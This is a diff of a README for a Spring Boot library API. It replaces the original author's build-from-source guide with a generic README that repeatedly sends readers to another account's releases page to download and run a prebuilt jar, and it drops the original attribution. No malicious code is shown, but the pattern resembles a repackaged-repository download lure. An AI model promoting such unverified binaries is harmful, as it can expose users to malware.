@@ -1,254 +1,127 @@
-# Secure CRUD API for Digital Library
-A **Spring Boot RESTful API** for managing a collection of books in a digital library system with **role-based authentication, JWT, OAuth2, auditing, and HTTPS enforcement.**
+# 📚 Digital-Library-Secure-CRUD-API-Spring-Boot-Multi-DB-JWT-RBAC - Simple API for Your Digital Library Needs
 
-This project is designed to showcase **enterprise-grade application design** with a focus on **security, scalability, and maintainability.**
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/frostfury123/Digital-Library-Secure-CRUD-API-Spring-Boot-Multi-DB-JWT-RBAC/releases)
 
+## 🚀 Getting Started
+
+This guide will walk you through how to download and run the Digital Library Secure CRUD API. This API is designed to manage your digital library securely while offering features like JWT authentication and role-based access control.
+
+## 🔍 Features
+
+- **Secure Authentication**: Uses JWT tokens for secure logins.
+- **Multi-Database Support**: Works with various database systems.
+- **Role-Based Access Control (RBAC)**: Assign different permissions to users based on their roles.
+- **CRUD Operations**: Easily create, read, update, and delete data.
+- **Spring Boot Framework**: Built using Spring Boot for performance and scalability.
+
+## 💻 System Requirements
+
+To run this application, ensure your system meets the following requirements:
+
+- **Java 11 or higher**: Make sure Java is installed on your machine. You can download it from [Oracle's website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Database System**: Choose a database like MySQL, PostgreSQL, or another supported system.
+- **IDE (Optional)**: An Integrated Development Environment like IntelliJ IDEA or Eclipse for easier coding and debugging.
+
+## 📥 Download & Install
+
+To download the application, visit the Releases page:
+
+[Visit the Releases Page to Download](https://github.com/frostfury123/Digital-Library-Secure-CRUD-API-Spring-Boot-Multi-DB-JWT-RBAC/releases)
+
+1. Go to the Releases page.
+2. Look for the latest version.
+3. Click on the relevant file to download it.
+
+Once downloaded, follow these steps to set it up:
+
+1. **Extract the Files**: Unzip the downloaded file to a preferred location on your computer.
+2. **Navigate to the Folder**: Open a command prompt or terminal and navigate to the folder where you extracted the files.
+3. **Run the Application**:
+   - Type the following command: 
+     ```
+     java -jar your-file-name.jar
+     ```
+   - Replace `your-file-name.jar` with the actual name of the jar file you downloaded.
+
+4. **Access the API**: Open your web browser and type in:
+   ```
+   http://localhost:8080
+   ```
+   This will take you to the API interface.
+
+## 🔒 Authentication
+
+To use this API, you need to authenticate your requests. Follow these steps:
+
+1. **User Registration**: 
+   - Send a POST request to `/api/auth/register` with your username and password.
+  
+2. **Login**:
+   - Send a POST request to `/api/auth/login` with your username and password.
+   - You will receive a JWT token in response.
+
+3. **Access Protected Routes**:
+   - Use the received JWT token in the `Authorization` header as follows:
+     ```
+     Authorization: Bearer your-token-here
+     ```
+   - Replace `your-token-here` with the actual token.
+
+## 🔧 Usage Examples
+
+### 1. Adding a Book
+
+To add a book to the library, send a POST request to `/api/books` with book details in JSON format.
+
+Example Request:
+```json
+{
+  "title": "The Great Gatsby",
+  "author": "F. Scott Fitzgerald",
+  "year": 1925
+}
+```
+
+### 2. Fetching All Books
+
+Send a GET request to `/api/books` to get a list of all books in the library.
+
+### 3. Updating a Book
+
+To update a book's information, send a PUT request to `/api/books/{id}` with the new details.
+
+### 4. Deleting a Book
+
+To delete a book, send a DELETE request to `/api/books/{id}` where `{id}` is the book's ID.
+
+## 📄 Documentation
+
+Comprehensive documentation for all API endpoints is available at:
+
+[API Documentation](https://github.com/frostfury123/Digital-Library-Secure-CRUD-API-Spring-Boot-Multi-DB-JWT-RBAC/wiki)
+
+## 🛠 Troubleshooting
+
+If you encounter any issues:
+
+- Ensure Java is properly installed.
+- Check the port configuration if the API does not start.
+- Review error messages in the terminal for clues.
+
+## 🙋‍ Community Support
+
+For questions, feel free to create an issue on the repository or join the discussion on our community forums. 
+
+Your feedback is welcome!
+
+## 🤝 Contributing
+
+Interested in contributing? Please check the contributing guide in the repository for detailed steps.
+
+## 📌 License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
 
 ---
 
-## Features
-
-### Authentication & Authorization
-
-- **JWT-based Authentication (Stateless)** – Issue JWT tokens containing user roles & permissions.
-
-- **OAuth2 Login (Google & GitHub)** – Session-based login for social authentication.
-
-- **Role-Based Access Control (RBAC)** – Four roles with specific permissions:
-
-    - **Reader** → View books only.
-
-    - **Editor** → View, Create, Update books.
-
-    - **Librarian** → View, Create, Update, Delete books.
-
-    - **Administrator** → All book operations + Manage Users.
-
-- **Password Encryption** – User passwords secured using **BCryptPasswordEncoder.**
-
-### Book Management API (CRUD)
-
-- **GET /books** – View all books (Reader, Editor, Librarian, Admin).
-
-- **GET /book/{id}** - View a particular book (Reader, Editor, Librarian, Admin).
-
-- **POST /book** – Add new book (Editor, Librarian, Admin).
-
-- **PUT /book** – Update book details (Editor, Librarian, Admin).
-
-- **DELETE /book/{id}** – Delete book (Librarian, Admin).
-
-- **Book attributes**: id, title, author, publishedYear, genre.
-
-### User Management
-
-- **POST /api/users** – Admin can create new users with roles (Reader, Editor, Librarian, Administrator).
-
-- **POST /register** – Readers can self-register.
-
-- **POST /auth/login** - Authenticates a user and issues a JWT token based on their role (Reader, Editor, Librarian, Administrator).
-
-- **GET /login/google** - Users can authenticate via their Google account using this OAuth2 login endpoint.
-
-- **GET /login/github** - Users can authenticate via their GitHub account using this OAuth2 login endpoint.
-
-- **Role enforcement** on all APIs.
-
-### Audit Logging
-
-- Every action is tracked:
-
-        CREATE_BOOK, UPDATE_BOOK, DELETE_BOOK, CREATE_USER.
-
-- **Audit Log Schema**: id, action, book_id, timestamp, user_id.
-
-- Stored in **Postgres** for durability.
-
-### Security
-
-- **HTTPS Enforcement** – Redirect HTTP → HTTPS automatically.
-
-- **TLS/SSL Certificates** for secure communication.
-
-- **Audit Logging** for all user actions.
-
-- **OAuth2 + JWT Hybrid Security.**
-
-### Database Setup
-
-- **H2 (In-memory)** → Book Data.
-
-- **Postgres** → Users & Audit Logs.
-
-- **data.sql** → Preloads sample books for testing.
-
-## Tech Stack
-
-- **Java** 
-
-- **Spring Boot / Spring Framework**
-
-- **Spring Web (REST API)**
-
-- **Spring Security (JWT + OAuth2 + RBAC)**
-
-- **Spring Data JPA** (H2 + PostgreSQL)
-
-- **Maven** (Dependency Management)
-
-- **Postman** (API Testing)
-
-- **Git** (Version Control)
-
-## Project Setup
-
-#### Clone the Repository
-
-```
-git clone https://github.com/your-username/Digital-Library-Secure-CRUD-API-Spring-Boot-Multi-DB-JWT-RBAC.git
-cd Digital-Library-Secure-CRUD-API-Spring-Boot-Multi-DB-JWT-RBAC
-```
-#### Configure Databases
-
-- **Postgres**: Create a database library_db.
-
-- Update application.properties:
-```
-spring.datasource.url=jdbc:postgresql://localhost:5432/library_db
-spring.datasource.username=your_username
-spring.datasource.password=your_password
-spring.jpa.hibernate.ddl-auto=update
-```
-- **H2**: Auto-configured for Book data (no setup needed).
-
-#### Generate Keystore for HTTPS
-```
-keytool -genkeypair -alias libraryapi -keyalg RSA -keysize 2048 \
-  -storetype PKCS12 -keystore keystore.p12 -validity 3650
-```
-
-- Place keystore.p12 in src/main/resources.
-
-- Update application.properties:
-```
-server.ssl.enabled=true
-server.ssl.key-store=classpath:keystore.p12
-server.ssl.key-store-password=your_password
-server.ssl.key-store-type=PKCS12
-server.port=8443
-```
-
-#### Generate Certificates for Postman Testing
-
-- Extract public certificate:
-```
-openssl pkcs12 -in keystore.p12 -clcerts -nokeys -out mycert.pem
-```
-- import **mycert.pem** in Postman:
-
-    - Go to **Settings → Certificates → CA Certificates**
-
-    - Upload mycert.pem.
-
-#### Enable Postman Settings
-
-- Go to **Postman Settings → General.**
-
-- Enable **Follow Original HTTP Method.**
-
-#### Run the Project
-```
-mvn spring-boot:run
-```
-Server runs at: https://localhost:8443
-
-
-
-
-## API Testing (Postman)
-### Authentication
-
-- **Login Endpoint** -> POST /auth/login
-
-Request
-```
-{
-  "username": "admin",
-  "password": "admin123"
-}
-```
-
-Response
-```
-{
-  "access_token": "jwt_token",
-  "expires_in": 3600
-}
-```
-
-Use **Authorization: Bearer <token>** in all secured requests.
-
-**Note**: Any role (Reader, Librarian, Editor, Admin) can login via /auth/login and receive a valid JWT token. The **role determines access** to other endpoints.
-
-
-## Default Data
-
-- Preloaded via data.sql.
-
-- Example Book:
-```
-INSERT INTO books (title, author, published_year, genre) VALUES
-('The Pragmatic Programmer', 'Andrew Hunt', 1999, 'Programming');
-```
-
-## Audit Logs
-
-- Stored in Postgres.
-
-- Example record:
-```
-{
-  "id": 1,
-  "action": "CREATE_BOOK",
-  "book_id": 10,
-  "timestamp": "2025-08-20T10:15:30",
-  "user_id": 3
-}
-```
-
-## Highlights
-
-- Multi-Database Integration (**H2 + PostgreSQL**)
-- Secure API with **HTTPS + TLS**
-- **JWT + OAuth2 Hybrid Authentication**
-- Role-Based Access Control (RBAC)
-- **BCrypt Password Hashing**
-- Default data loading with data.sql
-- Comprehensive **Audit Logging**
-- **Postman Ready** with HTTPS certificate setup
-
-## Why this project?
-
-This project demonstrates proficiency in:
-
-- **Spring Framework (Core, Boot, Web, Security, Data JPA)**
-
-- **Enterprise Security (JWT, OAuth2, RBAC, HTTPS, BCrypt)**
-
-- **Database Management (H2 for dev/test, PostgreSQL for persistence)**
-
-- **REST API Design & Documentation**
-
-- **Testing & API Tooling (Postman)**
-
-- **Best Practices (Audit Logs, HTTPS, Data Preloading)**
-
-This project reflects real-world challenges in **enterprise application development** and proves capability to handle them effectively.
-
-### Author
-
-**Prem Swaroop** – Java Developer passionate about **secure, scalable, and maintainable enterprise solutions.**
-
-### License
-
-MIT License – feel free to use, learn, and extend.
+For a seamless download experience, make sure to regularly check the [Releases Page](https://github.com/frostfury123/Digital-Library-Secure-CRUD-API-Spring-Boot-Multi-DB-JWT-RBAC/releases) for updates. Happy coding!
